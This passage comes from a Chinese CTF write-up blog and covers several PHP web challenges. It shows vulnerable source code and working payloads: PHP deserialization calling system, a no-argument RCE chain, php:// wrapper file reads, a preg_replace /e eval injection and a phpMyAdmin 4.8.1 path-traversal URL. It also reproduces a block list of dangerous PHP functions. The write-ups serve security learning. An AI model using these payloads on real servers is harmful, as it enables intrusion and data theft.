/flag&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>能使用通配符</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>题目</p><p><img src="../images/image-20230406193358450.png" alt="image-20230406193358450"></p><p>这里给了个date()函数，然后下面就出现个时间，但还是不知道有什么用</p><p>抓个包</p><p><img src="../images/image-20230406193537404.png" alt="image-20230406193537404"></p><p>看到了这个东西,就猜测是func是函数，p是内容</p><p>那么我们就进行测试一下</p><p><img src="../images/image-20230406193705019.png" alt="image-20230406193705019"></p><p>抓取到了源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话提供的这个类才是重点，不会进行过滤，可以直接用自己想用的函数</p><p>然后进行序列化，然后在用反序列化函数将命令进行执行</p><p>序列化代码(序列化之后注意将空格修改为+号，或者采用get方式进行传输）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>然后使用反序列化函数进行反序列化</p><p><img src="../images/image-20230406194638777.png" alt="image-20230406194638777"></p><p>完成绕过</p><p>还有一种解法</p><p><img src="../images/image-20230406194840536.png" alt="image-20230406194840536"></p><p><strong>\system可以绕过黑名单的原因：php内的” \ “在做代码执行的时候，会识别特殊字符串。</strong></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>REMOTE_ADDR 是你的客户端跟你的服务器“握手”时候的IP。如果使用了“匿名代理”，REMOTE_ADDR将显示代理服务器的IP。</strong><br>HTTP_CLIENT_IP 是代理服务器发送的HTTP头。如果是“超级匿名代理”，则返回none值。同样，REMOTE_ADDR也会被替换为这个代理服务器的IP。<br><strong>$_SERVER[‘REMOTE_ADDR’]; //访问端（有可能是用户，有可能是代理的）IP</strong>$<strong>_SERVER[‘HTTP_CLIENT_IP’]; //代理端的（有可能存在，可伪造）<br>$_SERVER[‘HTTP_X_FORWARDED_FOR’]; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）</strong></p><p><a href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">这篇文章讲的透彻</a></p><p><a href="https://paper.seebug.org/164/">escapeshellarg()和escapeshellcmd()</a></p><p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">这篇wp写的非常详细，我这里就不写了</a></p><p>对于这些转义字符和那两个函数执行的过程，认真看看就能明白了</p><p><img src="../images/image-20230406202802386.png" alt="image-20230406202802386"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>题目</p><p><img src="../images/image-20230406202925322.png" alt="image-20230406202925322"></p><p>没啥东西，但是扫目录的时候发现了</p><p><img src="../images/image-20230406203421874.png" alt="image-20230406203421874"></p><p>这四个git东西，但是都下载下来没看到啥有用的信息，然后我们就去看看其相对应的工具来看看能不能拿到什么有用的信息</p><p>尝试使用 <a href="https://so.csdn.net/so/search?q=GitHack&amp;spm=1001.2101.3001.7020">GitHack</a> 看看是不是源码泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/GitHack</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204017689.png" alt="image-20230406204017689"></p><p><img src="../images/image-20230406204033529.png" alt="image-20230406204033529"></p><p><img src="../images/image-20230406204049843.png" alt="image-20230406204049843"></p><p>拿到了源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204529234.png" alt="image-20230406204529234"></p><p>扒下了网站的源码<br>好了，现在就是代码审计了<br>最吸引眼球的就是 eval的一句话木马，题目又加了好多过滤限制了REC<br>首先是 php伪协议 data协议 filter协议 都不能使用了<br>然后该网站使用了正则匹配 其实这就是无参数的rce</p><p>如果如果’;’===preg<em>replace(…)，那么就执行exp传递的命令<br>**(?R)? : (?R)代表当前表达式，就是这个(/[a-z,</em>]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)<em>则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))*</em></p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code>这个就是得要求传入的exp得全部杯匹配进行替换，替换只剩下     <strong>；</strong>才行，和题目说的一样   —-&gt;   <strong>套娃</strong></p><p>无参数REC 一般有三种绕过姿势：</p><ul><li><strong>gettallheaders（）</strong></li><li><strong>get_defined_vars()</strong></li><li><strong>session_id()</strong><br><strong>具体可以<a href="https://blog.csdn.net/Manuffer/article/details/120738755">参考博客</a></strong></li></ul><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</span><br></pre></td></tr></table></figure><p><strong>原理</strong></p><p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。<br><img src="../images/image-20230406205415420.png" alt="image-20230406205415420"></p><p><strong>方法二</strong><br>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取/设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file( session_id(session_start()));</span><br></pre></td></tr></table></figure><p>session_id(session_start())<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。<br><img src="../images/image-20230406205748900.png" alt="image-20230406205748900"></p><p><strong>PHPSESSID来找到服务端的session文件，通过对这个session文件的读写操作即实现了session的超全局变量属性</strong></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我想到伪协议的原因是因为访问next.php的时候，访问不了，而且这里还是个include</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line">data:<span class="comment">//text/plain,..(注意抓包的时候，$text参数里的空格是%20)   这个伪协议也行</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406212130699.png" alt="image-20230406212130699"></p><p>拿到了next.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里主要涉及到<code>preg_replace</code>的一个RCE漏洞   <a href="https://xz.aliyun.com/t/2557">preg_replaceRCE</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>主要就是构造<code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;此处填函数名&#125;&#125;);</code><br>大概就是把所有字符替换为函数执行结果。<br>但是GET传<code>.*=xxx</code>会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//755f7227-48c2-4d56-91a8-c2c6b5518680.node3.buuoj.cn/next.php?\S*=$&#123;eval($_POST[cmd])&#125;</span></span><br></pre></td></tr></table></figure><p>同时post一个<code>cmd=system(&quot;cat /flag&quot;);</code></p><p>\S*表示连续匹配多个非空白字符</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;<span class="title function_ invoke__">getFlag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>题目</p><p>考点：phpadmin 4.8.1远程<a href="https://so.csdn.net/so/search?q=文件包含漏洞&amp;spm=1001.2101.3001.7020">文件包含漏洞</a>（CVE-2018-12613）</p><p><img src="../images/image-20230406225519111.png" alt="image-20230406225519111"></p><p>这里扫目录扫出来phpmyadmin</p><p><img src="../images/image-20230406225757816.png" alt="image-20230406225757816"></p><p>看到版本号</p><p><a href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</a></p><p><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a></p><p>上面的两个链接是对这个漏洞的讲解，简单来说，就是这个漏洞的源文件（index.php）存在解码漏洞，源码内对url进行了？的分割，在分割前，又对参数进行了urldecode,且如果?号前面的文件就是taget在白名单里，就可以绕过，这样我们一是令target=db_sql.php，而是在传参使对?进行二次url编码，即?变为%253f</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406230040730.png" alt="image-20230406230040730"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>题目</p><p><img src="../images/image-20230406230218432.png" alt="image-20230406230218432"></p><p>是一个网站</p><p>扫一下网址发现/.git    然后猜测是不是git源码泄露</p><p>用GitHack来测试一下</p><p>发现存在源码泄露</p><p><img src="../images/image-20230406231502698.png" alt="image-20230406231502698"></p><p>然后读取得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　　